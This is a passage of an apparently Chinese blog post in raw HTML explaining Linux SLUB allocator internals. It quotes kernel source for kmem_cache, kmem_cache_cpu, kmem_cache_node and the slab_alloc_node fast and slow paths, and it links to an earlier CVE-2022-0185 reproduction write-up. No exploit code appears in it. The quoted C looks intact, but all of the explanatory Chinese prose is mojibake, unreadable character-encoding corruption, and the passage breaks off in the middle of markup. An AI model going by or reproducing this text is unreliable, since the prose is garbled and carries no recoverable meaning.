title="kmem_cache"></a>kmem_cache</h3><p><code>kmem_cache</code>æƒ³å¿…å„ä½è¾ƒä¸ºç†Ÿæ‚‰ï¼Œå…¶ç”¨äºåˆ†é…ç‰¹å®šå¤§å°å¯¹è±¡çš„å†…å­˜æ± ï¼Œæ‰€æœ‰çš„<code>kmem_cache</code>æ„æˆä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå¹¶å­˜æ”¾äºä¸€ä¸ªç”¨äºå­˜æ”¾é€šç”¨<code>kmem_cache</code>çš„æ•°ç»„<code>kmem_caches</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *</span></span><br><span class="line"><span class="class"><span class="title">kmalloc_caches</span>[<span class="title">NR_KMALLOC_TYPES</span>][<span class="title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="title">ro_after_init</span> =</span></span><br><span class="line">&#123; <span class="comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;</span><br><span class="line">EXPORT_SYMBOL(kmalloc_caches);</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çœ‹ä¸€ä¸‹<code>kmem_cache</code>çš„å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLUB_TINY</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line"><span class="keyword">slab_flags_t</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_size</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset;<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="comment">/* Number of per cpu partial slabs to keep around */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial_slabs;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> allocflags;<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line"><span class="keyword">int</span> refcount;<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line"><span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;<span class="comment">/* Offset to metadata */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> align;<span class="comment">/* Alignment */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;<span class="comment">/* Left redzone padding size */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *name;<span class="comment">/* Name (only for display!) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span><span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span><span class="comment">/* For sysfs */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN_GENERIC</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;<span class="comment">/* Usercopy region offset */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;<span class="comment">/* Usercopy region size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿™é‡Œç¬¬ä¸€ä¸ªæˆå‘˜<code>cpu_slab</code>å…¶ä¸º<code>__percpu</code>å˜é‡æŒ‡å‘ä¸€ä¸ª<code>kmem_cache_cpu</code>ç»“æ„ä½“ï¼Œå³å½“å‰CPUç‹¬å çš„å†…å­˜æ± ã€‚<code>min_partial</code>æŒ‡çš„æ˜¯<code>node partial</code>é“¾è¡¨ä¸Šslabçš„æœ€å¤§æ•°é‡ã€‚<code>cpu_partial_slabs</code>æŒ‡çš„æ˜¯<code>cpu partial</code>é“¾è¡¨ä¸Šslabçš„æœ€å¤§æ•°é‡ã€‚<code>size</code>ä¸€ä¸ªå¯¹è±¡çš„å®é™…å¤§å°ã€‚<code>object_size</code>å¯¹è±¡æ‰€æœ‰æ•°æ®çš„å¤§å°ã€‚<code>offset</code>å³ç©ºé—²å¯¹è±¡é“¾è¡¨æŒ‡é’ˆå¯¹äºå…¶å¯¹è±¡çš„åç§»ã€‚<code>min</code>ä¸€ä¸ªslabä¸Šæœ€å°‘çš„å¯¹è±¡æ•°é‡ã€‚<code>allocflags</code>å‘<code>buddy system</code>ç”³è¯·é¡µé¢æ—¶æ‰€ä½¿ç”¨çš„<code>gfp flag</code>ã€‚<code>ctor</code>å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚</p><p><code>random_seq</code>: ç”¨äºåœ¨ slab åˆå§‹åŒ–æ—¶éšæœºåŒ– freelist ä¸Šç©ºé—²å¯¹è±¡çš„è¿æ¥é¡ºåºã€‚</p><p><code>useroffset</code>: ç”¨æˆ·ç©ºé—´èƒ½è¯»å†™çš„èµ·å§‹åç§»ï¼Œåé¢çš„å°±æ—¶ç”¨æˆ·ç©ºé—´èƒ½è¯»å†™çš„å¤§å°ã€‚</p><p><code>node</code>: ä¸€ä¸ª <code>kmem_cache_node</code> æ•°ç»„ï¼Œå¯¹åº”å¤šä¸ªä¸åŒ node çš„åå¤‡å†…å­˜æ± </p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/D4idvgzLAaqIBQM.png"                                     ></p><p>å…³äºå…¶åˆå¹¶å’Œç±»å‹ä¹‹ç±»çš„å‰é¢çš„æ–‡ç« æåˆ°è¿‡ï¼Œå¯ä»¥å»çœ‹çœ‹ <a class="link"   href="https://cv196082.gitee.io/2023/10/15/CVE-2022-0185/" >CVE-2022-0185å¤ç°<i class="fas fa-external-link-alt"></i></a> ã€‚</p><h3 id="kmem-cache-cpu"><a href="#kmem-cache-cpu" class="headerlink" title="kmem_cache_cpu"></a>kmem_cache_cpu</h3><p>å½“ä¸€ä¸ªè¿›ç¨‹è¯·æ±‚åˆ†é…å†…å­˜æ—¶ï¼Œé¦–å…ˆä¼šå°è¯•å‘å½“å‰CPUçš„ç‹¬å å†…å­˜æ± è¿›è¡Œåˆ†é…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> **freelist;<span class="comment">/* Pointer to next available object */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tid;<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">freelist_aba_t</span> freelist_tid;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span><span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">partial</span>;</span><span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">local_lock_t</span> lock;<span class="comment">/* Protects the fields above */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line"><span class="keyword">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è€Œè¿™é‡Œçš„<code>kmem_cache_cpu</code>ç»“æ„ä½“ä»£è¡¨çš„å°±æ˜¯æ¯ä¸ªCPUç‹¬å çš„å†…å­˜æ± ã€‚è¿™é‡Œçš„ç»“æ„ä½“æ¯”è¾ƒç®€å•ä¸”çœ¼ç†Ÿï¼Œé¦–å…ˆå°±æ˜¯<code>freelist</code>å«ä¹‰ä¸€æ ·æŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²çš„å¯¹è±¡ã€‚<code>slab</code>æŒ‡å‘å½“å‰ç”¨äºåˆ†é…çš„slabã€‚<code>partial</code>æŒ‡å‘çš„æ˜¯<code>percpu partial list</code>é“¾è¡¨ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/xSLqghNZ23nCMiz.png"                                     ></p><h3 id="kmem-cache-node"><a href="#kmem-cache-node" class="headerlink" title="kmem_cache_node"></a>kmem_cache_node</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"> <span class="comment">// ... ...</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="keyword">spinlock_t</span> list_lock;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr_partial;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="keyword">atomic_long_t</span> nr_slabs;</span><br><span class="line"><span class="keyword">atomic_long_t</span> total_objects;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶å«ä¹‰ä¸ºæ¯ä¸ªnodeçš„åå¤‡å†…å­˜æ± ï¼Œå½“<code>percpu</code>çš„å†…å­˜æ± åˆ†é…å®Œæ¯•ä¹‹åå°±ä¼šæƒ³nodeçš„åå¤‡å†…å­˜æ± è¿›è¡Œå†…å­˜ç”³è¯·ã€‚</p><p>è¿™é‡Œçš„<code>partial</code>æˆå‘˜åŒå‰é¢çš„ä¸€è‡´ï¼Œ<code>nr_partial</code>å¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯<code>partial</code>çš„æ•°é‡ã€‚è¿™é‡Œçš„<code>full</code>æˆå‘˜è¿æ¥çš„æ˜¯<code>slab page</code>ä¸­çš„æ‰€æœ‰å¯¹è±¡éƒ½å·²ç»è¢«ä½¿ç”¨çš„slabå¦å¤–ä¸¤ä¸ªè®¡æ•°çš„ä¹Ÿå¾ˆå¥½ç†è§£äº†ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/ECDOVtxAyiwd1UZ.png"                                     ></p><h2 id="å¯¹è±¡çš„åˆ†é…"><a href="#å¯¹è±¡çš„åˆ†é…" class="headerlink" title="å¯¹è±¡çš„åˆ†é…"></a>å¯¹è±¡çš„åˆ†é…</h2><h3 id="slab-alloc-node"><a href="#slab-alloc-node" class="headerlink" title="slab_alloc_node"></a>slab_alloc_node</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __fastpath_inline <span class="keyword">void</span> *<span class="title">slab_alloc_node</span><span class="params">(struct kmem_cache *s, struct list_lru *lru,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">size_t</span> orig_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obj_cgroup</span> *<span class="title">objcg</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">bool</span> init = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">s = slab_pre_alloc_hook(s, lru, &amp;objcg, <span class="number">1</span>, gfpflags);</span><br><span class="line"><span class="keyword">if</span> (!s)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">object = kfence_alloc(s, orig_size, gfpflags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(object))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">object = __slab_alloc_node(s, gfpflags, node, addr, orig_size);</span><br><span class="line"></span><br><span class="line">maybe_wipe_obj_freeptr(s, object);</span><br><span class="line">init = slab_want_init_on_alloc(gfpflags, s);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When init equals &#x27;true&#x27;, like for kzalloc() family, only</span></span><br><span class="line"><span class="comment"> * @orig_size bytes might be zeroed instead of s-&gt;object_size</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab_post_alloc_hook(s, objcg, gfpflags, <span class="number">1</span>, &amp;object, init, orig_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯é€šè¿‡<code>slab_pre_alloc_hook</code>å‡½æ•°è¿›è¡Œæ£€æµ‹æ ‡è¯†ä½ï¼Œéšåè°ƒç”¨<code>kfence_alloc</code>è¿›è¡Œå†…å­˜é”™è¯¯æ£€æµ‹ï¼Œæ¥ä¸‹æ¥è°ƒç”¨<code>__slab_alloc_node</code>å‡½æ•°è¿›è¡ŒçœŸæ­£çš„å†…å­˜åˆ†é…ï¼Œæœ€åä¸¤ä¸ªå‡½æ•°åˆ™æ˜¯å°†å¯¹è±¡åŸæœ¬ç”¨äºå­˜æ”¾<code>next object</code>çš„ä½ç½®å†™ä¸º0ï¼Œæœ€ååˆ™æ˜¯çœ‹æ ‡è¯†ä½æ˜¯å¦æœ‰<code>__GFP_ZERO</code>ï¼Œè‹¥æ˜¯æœ‰åˆ™è°ƒç”¨<code>slab_post_alloc_hook</code>å°†å †å—ä¸Šçš„æ•°æ®æ¸…é›¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *__slab_alloc_node(struct kmem_cache *s,</span><br><span class="line"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">size_t</span> orig_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line">redo:</span><br><span class="line">c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">tid = READ_ONCE(c-&gt;tid);</span><br><span class="line">barrier();</span><br><span class="line">object = c-&gt;freelist;</span><br><span class="line">slab = c-&gt;slab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!USE_LOCKLESS_FAST_PATH() ||</span><br><span class="line">    unlikely(!object || !slab || !node_match(slab, node))) &#123;</span><br><span class="line">object = __slab_alloc(s, gfpflags, node, addr, c, orig_size);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!__update_cpu_freelist_fast(s, object, next_object, tid))) &#123;</span><br><span class="line">note_cmpxchg_failure(<span class="string">&quot;slab_alloc&quot;</span>, s, tid);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line">prefetch_freepointer(s, next_object);</span><br><span class="line">stat(s, ALLOC_FASTPATH);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿™é‡Œè·å–<code>percpu</code>ä¸Šçš„<code>kmem_cache_cpu</code>ï¼Œç„¶åè·å¾—å…¶<code>freelist</code>ä»¥åŠ<code>slab</code>ã€‚è‹¥ slab æˆ– freelist ä¸ºç©º / slab ä¸ node ä¸åŒ¹é…ï¼Œåˆ™è°ƒç”¨ <code>__slab_alloc()</code> åˆ†é…ä¸€å¼ æ–° slab å¹¶ä»å…¶ä¸­è·å–ä¸€ä¸ªç©ºé—²å¯¹è±¡ã€‚</p><p>è¿™é‡Œå…ˆè€ƒè™‘æ¡ä»¶æˆç«‹çš„æƒ…å†µé‚£ä¹ˆå°±ä¼šè°ƒç”¨<code>get_freepointer_safe</code>è·å–åˆ°å½“å‰ç©ºé—²å¯¹è±¡çš„ä¸‹ä¸€ä¸ªç©ºé—²å¯¹è±¡ï¼Œæ¥ä¸‹æ¥è°ƒç”¨<code>__update_cpu_freelist_fast</code>å‡½æ•°è¿›è¡Œæ£€æŸ¥æ˜¯å¦å‘ç”Ÿäº†æŠ¢å ï¼Œå¦‚æœæ˜¯åˆ™è·³å›redoé‡æ–°è·å–<code>kmem_cache_cpu</code>ã€‚æœ€åé€šè¿‡<code>prefetch_freepointer</code>å°†å·²åˆ†é…å¯¹è±¡çš„åœ°å€è½½å…¥ç¼“å­˜ä¸­ï¼Œä¹‹åè¿”å›åˆ†é…æˆåŠŸçš„å¯¹è±¡ã€‚</p><p>å‰é¢ä¸»è¦è¯´çš„æ˜¯å½“<code>slab</code>å’Œ<code>freelist</code>å­˜åœ¨æ—¶çš„æƒ…å†µï¼Œä¸‹é¢ä¸»è¦æä¸€ä¸‹ifåˆ†æ”¯å†…çš„å†…å®¹ã€‚è¿™é‡Œæ˜¯ç›´æ¥è°ƒç”¨äº†<code>__slab_alloc</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *__slab_alloc(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node,</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, struct kmem_cache_cpu *c, <span class="keyword">unsigned</span> <span class="keyword">int</span> orig_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We may have been preempted and rescheduled on a different</span></span><br><span class="line"><span class="comment"> * cpu before disabling preemption. Need to reload cpu area</span></span><br><span class="line"><span class="comment"> * pointer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">c = slub_get_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">p = ___slab_alloc(s, gfpflags, node, addr, c, orig_size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span></span><br><span class="line">slub_put_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸»è¦æ˜¯å¯¹<code>___slab_alloc</code>å‡½æ•°çš„wrapper</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span 